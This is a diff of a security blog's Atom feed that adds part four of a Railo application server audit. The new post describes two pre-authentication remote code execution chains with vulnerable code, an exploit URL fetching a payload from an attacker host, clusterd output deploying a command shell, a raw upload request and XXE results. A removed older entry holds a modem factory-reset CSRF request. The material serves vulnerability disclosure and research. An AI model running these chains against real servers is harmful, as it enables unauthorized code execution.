@@ -4,7 +4,7 @@
   <title><![CDATA[forelsec]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-08-23T13:12:08-06:00</updated>
+  <updated>2014-08-27T23:29:44-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -14,6 +14,406 @@
 
   
   <entry>
+    <title type="html"><![CDATA[railo security - part four - pre-auth remote code execution]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four/"/>
+    <updated>2014-08-27T15:00:00-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four</id>
+    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-auth rce</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three">Part three &ndash; pre-auth password retrieval</a></em><br/>
+<em>Part four &ndash; pre-auth remote code execution</em></p>
+
+<p>This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you&rsquo;ve skipped the first three parts of this blog post to get to the juicy stuff, I don&rsquo;t blame you, but I do recommend going back and reading them; there&rsquo;s some important information and details back there.  In this post, we&rsquo;ll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd&rsquo;s implementation on one of these.</p>
+
+<p>The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file <code>thumbnail.cfm</code>, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.</p>
+
+<p><code>thumbnail.cfm</code> first generates a hash of the image along with it&rsquo;s width and height:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset url.img=trim(url.img)&gt;
+</span><span class='line'>&lt;cfset id=hash(url.img&"-"&url.width&"-"&url.height)&gt;
+</span><span class='line'>&lt;cfset mimetypes={png:'png',gif:'gif',jpg:'jpeg'}&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once it&rsquo;s got a hash, it checks if the file exists, and if not, attempts to read and write it down:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffile action="readbinary" file="#url.img#" variable="data"&gt;
+</span><span class='line'>&lt;cfimage action="read" source="#data#" name="img"&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;!--- shrink images if needed ---&gt;
+</span><span class='line'>&lt;cfif img.height GT url.height or img.width GT url.width&gt;
+</span><span class='line'>    &lt;cfif img.height GT url.height &gt;
+</span><span class='line'>        &lt;cfimage action="resize" source="#img#" height="#url.height#" name="img"&gt;
+</span><span class='line'>    &lt;/cfif&gt;
+</span><span class='line'>    &lt;cfif img.width GT url.width&gt;
+</span><span class='line'>        &lt;cfimage action="resize" source="#img#" width="#url.width#" name="img"&gt;
+</span><span class='line'>    &lt;/cfif&gt;
+</span><span class='line'>    &lt;cfset data=toBinary(img)&gt;
+</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>cffile</code> tag is used to read the raw image and then cast it via the <code>cfimage</code> tag.  The wonderful thing about <code>cffile</code> is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&width=5000&height=50000</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don&rsquo;t want this, and thus we provide large width and height values.  This file is written out to <code>/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]</code>.</p>
+
+<p>We&rsquo;ve now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter <code>jsloader.cfc</code>.</p>
+
+<p><code>jsloader.cfc</code> is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called <code>get</code>, which accepts a single argument <code>lib</code>, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don&rsquo;t work here, like they would in PHP.  Here&rsquo;s the relevant code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset var filePath = expandPath('js/#arguments.lib#.js')/&gt;
+</span><span class='line'>    &lt;cfset var local = {result=""} /&gt;&lt;cfcontent type="text/javascript"&gt;
+</span><span class='line'>        &lt;cfsavecontent variable="local.result"&gt;
+</span><span class='line'>            &lt;cfif fileExists(filePath)&gt;
+</span><span class='line'>                &lt;cfinclude template="js/#arguments.lib#.js"/&gt;
+</span><span class='line'>            &lt;/cfif&gt;
+</span><span class='line'>        &lt;/cfsavecontent&gt;
+</span><span class='line'>    &lt;cfreturn local.result /&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s tie all this together.  Using <code>thumbnail.cfm</code>, we can write well-formed images to the file system, and using the <code>jsloader.cfc</code> file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single <code>&lt;?phpinfo();?&gt;</code> will be discovered and executed; the CFML engine works the same way.</p>
+
+<p>Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to <code>.js</code>, and write it via <code>thumbnail.cfm</code>.  We then retrieve the file via <code>jsloader.cfc</code> and, because we&rsquo;re loading it with a CFM file, it will be parsed and executed.  Let&rsquo;s check this out:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer jsload
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.3.1 - clustered attack toolkit
+</span><span class='line'>            [Supporting 6 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
+</span><span class='line'> [2014-06-15 03:39PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-06-15 03:39PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-06-15 03:39PM] Server hinted at 'railo'
+</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server...
+</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator...
+</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator...
+</span><span class='line'> [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
+</span><span class='line'> [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
+</span><span class='line'> [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
+</span><span class='line'> [2014-06-15 03:39PM] Fingerprinting completed.
+</span><span class='line'> [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] &gt; 
+</span><span class='line'> [2014-06-15 03:39PM] Preparing to deploy cmd.cfml...
+</span><span class='line'> [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
+</span><span class='line'> [2014-06-15 03:40PM] Invoking stager and deploying payload...
+</span><span class='line'> [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
+</span><span class='line'> [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
+</span><span class='line'> [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.</p>
+
+<p>Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to <code>jsloader.cfc</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif arguments.lib CT ".."&gt;
+</span><span class='line'>    &lt;cfheader statuscode="400"&gt;
+</span><span class='line'>    &lt;cfreturn "// 400 - Bad Request"&gt;
+</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>arguments.lib</code> variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can&rsquo;t substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that <code>jsloader.cfc</code> reads from; then we don&rsquo;t need to traverse out at all.</p>
+
+<p>We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still proves elusive.</p>
+
+<p>buuuuuuuuuuuuuuuuuuuuuuuuut</p>
+
+<p>Recall the <code>img.cfm</code> LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than <code>jsloader.cfc</code>, as we don&rsquo;t need to traverse as far.  This bug only affects versions 4.1 &ndash; 4.2.1, as <code>thumbnail.cfm</code> wasn&rsquo;t added until 4.1.  <code>CVE-2014-5468</code> has been assigned to this issue.</p>
+
+<p>The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the <code>&lt;cfadmin&gt;</code> tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is <code>overview.uploadNewLangFile.cfm</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif structKeyExists(form, "newLangFile")&gt;
+</span><span class='line'>    &lt;cftry&gt;
+</span><span class='line'>        &lt;cffile action="UPLOAD" filefield="form.newLangFile" destination="#expandPath('resources/language/')#" nameconflict="ERROR"&gt;
+</span><span class='line'>        &lt;cfcatch&gt;
+</span><span class='line'>            &lt;cfthrow message="#stText.overview.langAlreadyExists#"&gt;
+</span><span class='line'>        &lt;/cfcatch&gt;
+</span><span class='line'>    &lt;/cftry&gt;
+</span><span class='line'>    &lt;cfset sFile = expandPath("resources/language/" & cffile.serverfile)&gt;
+</span><span class='line'>    &lt;cffile action="READ" file="#sFile#" variable="sContent"&gt;
+</span><span class='line'>    &lt;cftry&gt;
+</span><span class='line'>        &lt;cfset sXML     = XMLParse(sContent)&gt;
+</span><span class='line'>        &lt;cfset sLang    = sXML.language.XMLAttributes.label&gt;
+</span><span class='line'>        &lt;cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)&gt;
+</span><span class='line'>        &lt;cfcatch&gt;
+</span><span class='line'>            &lt;cfthrow message="#stText.overview.ErrorWhileReadingLangFile#"&gt;
+</span><span class='line'>        &lt;/cfcatch&gt;
+</span><span class='line'>    &lt;/cftry&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I mean, this might as well be an upload form to write arbitrary files.  It&rsquo;s stupid simple to get arbitrary data written to the system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
+</span><span class='line'>Host: localhost:8888
+</span><span class='line'>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>Referer: http://localhost:8888/railo-context/admin/server.cfm
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Content-Type: multipart/form-data; boundary=AaB03x
+</span><span class='line'>Content-Length: 140
+</span><span class='line'>
+</span><span class='line'>--AaB03x
+</span><span class='line'>Content-Disposition: form-data; name="newLangFile"; filename="xxxxxxxxx.lang"
+</span><span class='line'>Content-Type: text/plain
+</span><span class='line'>
+</span><span class='line'>thisisatest
+</span><span class='line'>--AaB03x--</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The tricky bit is where it&rsquo;s written too; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within <code>railo-context.ra</code>.  A mirror of these can be found under the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I&rsquo;ll walk the logic used to generate these, but as a precusor, we aren&rsquo;t going to figure these out without some other fashionable info disclosure bug.</p>
+
+<p>The hashes are calculated in <code>railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>temp=temp.getRealResource("compress");                
+</span><span class='line'>temp=temp.getRealResource(MD5.getDigestAsString(cid+"-"+ffile.getAbsolutePath()));
+</span><span class='line'>if(!temp.exists())temp.createDirectory(true);
+</span><span class='line'>}
+</span><span class='line'>catch(Throwable t){}
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>    if(temp!=null) {
+</span><span class='line'>        String name=Caster.toString(actLastMod)+":"+Caster.toString(ffile.length());
+</span><span class='line'>        name=MD5.getDigestAsString(name,name);
+</span><span class='line'>        root=temp.getRealResource(name);
+</span><span class='line'>        if(actLastMod&gt;0 && root.exists()) return;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first hash is then <code>cid + "-" + ffile.getAbsolutePath()</code>, where <code>cid</code> is the randomly generated ID found in the <code>id</code> file (see part two) and <code>ffile.getAbsolutePath()</code> is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.</p>
+
+<p>The second hash is <code>actLastMode + ":" + ffile.length()</code>, where <code>actLastMode</code> is the last modified time of the file and <code>ffile.length()</code> is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts &lt;= 4.0 are exploitable, as we can list files with the XXE via the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py 
+</span><span class='line'>88d817d1b3c2c6d65e50308ef88e579c
+</span><span class='line'>
+</span><span class='line'>[SNIP - in which we modify the path to include ^]
+</span><span class='line'>
+</span><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+</span><span class='line'>0bdbf4d66d61a71378f032ce338258f2
+</span><span class='line'>
+</span><span class='line'>[SNIP - in which we modify the path to include ^]
+</span><span class='line'>
+</span><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+</span><span class='line'>admin
+</span><span class='line'>admin_cfc$cf.class
+</span><span class='line'>admin_cfm$cf.class
+</span><span class='line'>application_cfc$cf.class
+</span><span class='line'>application_cfm$cf.class
+</span><span class='line'>component_cfc$cf.class
+</span><span class='line'>component_dump_cfm450$cf.class
+</span><span class='line'>doc
+</span><span class='line'>doc_cfm$cf.class
+</span><span class='line'>form_cfm$cf.class
+</span><span class='line'>gateway
+</span><span class='line'>graph_cfm$cf.class
+</span><span class='line'>jquery_blockui_js_cfm1012$cf.class
+</span><span class='line'>jquery_js_cfm322$cf.class
+</span><span class='line'>META-INF
+</span><span class='line'>railo_applet_cfm270$cf.class
+</span><span class='line'>res
+</span><span class='line'>templates
+</span><span class='line'>wddx_cfm$cf.class</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>http_test_xxe.py</code> is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions &lt;= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.</p>
+
+<p>The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.</p>
+
+<p>As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Version 4.2:
+</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
+</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
+</span><span class='line'>Version 4.1:
+</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
+</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+</span><span class='line'>Version 4.0:
+</span><span class='line'>    - Pre-authentication LFI via XXE (Install/Express)
+</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
+</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
+</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+</span><span class='line'>Version 3.x:
+</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
+</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
+</span><span class='line'>    - Pre-authentication LFI via XXE (Install/Express)
+</span><span class='line'>    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but <em>desperately</em> in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here&rsquo;s to hoping they follow through.</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-getrailo-error.jpg"></p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[railo security - part three - pre-authentication LFI]]></title>
     <link href="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/"/>
     <updated>2014-08-23T15:00:00-06:00</updated>
@@ -21,7 +421,7 @@
     <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
 <em>Part three &ndash; pre-authentication LFI</em><br/>
-<em>Part four</em></p>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
 
 <p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>
 
@@ -227,7 +627,7 @@
     <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
 <em>Part two &ndash; post-authentication rce</em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
-<em>Part four</em></p>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
 
 <p>This post continues our dive into Railo security, this time introducing several post-authentication RCE vulnerabilities discovered in the platform.  As stated in part one of this series, like ColdFusion, there is a task scheduler that allows authenticated users the ability to write local files.  Whilst the existence of this feature sets it as the standard way to shell a Railo box, sometimes this may not work.  For example, in the event of stringent firewall rules, or irregular file permissions, or you&rsquo;d just prefer not to make remote connections, the techniques explored in this post will aid you in this manner.</p>
 
@@ -863,7 +1263,7 @@
     <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
 <em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
-<em>Part four</em></p>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
 
 <p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>
 
@@ -4626,161 +5026,6 @@ It&rsquo;s also of interest that none of this code verifies the authenticity of 
 <p><img class="src" src="http://3.bp.blogspot.com/-N4SxE1sJCMI/UZpyu-ABNWI/AAAAAAAAAeM/mJREYhveVCs/s640/kimai_run.jpg"></p>
 
 <p><a href="http://www.exploit-db.com/exploits/25606/">Exploit</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Motorola Surfboard - Multiple Vulnerabilities]]></title>
-    <link href="http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities/"/>
-    <updated>2013-04-21T00:06:45-06:00</updated>
-    <id>http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities</id>
-    <content type="html"><![CDATA[<p>It would appear that these vulnerabilities were disclosed a few years ago (<a href="http://www.cvedetails.com/cve/CVE-2008-2002/">CVE-2008-2002</a> and <a href="http://www.cvedetails.com/cve/CVE-2006-5196/">CVE-2006-5196</a>), but my relatively new (1-2 years) Motorola Surfboard SB5101U (verified against both the 101 and 101U), loaded with SB5101NU-2.1.7.0-GA-00-388-NOSH, appears to be vulnerable to the same CSRF&rsquo;s exposed prior.  With no authentication system in place at all, it would appear that a local DoS is not much of a concern to them.  It&rsquo;s interesting that, despite the sudden flood of discovered vulnerabilities in routers, nobody is really taking a look at the other piece of hardware between you and the ISP.  As I poked about this modem, I discovered a few other interesting things.</p>
-
-<p>First, here&rsquo;s the POST to reset the modem to factory defaults:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
-</span><span class='line'>Host: 192.168.100.1
-</span><span class='line'>Proxy-Connection: keep-alive
-</span><span class='line'>Content-Length: 34
-</span><span class='line'>Cache-Control: max-age=0
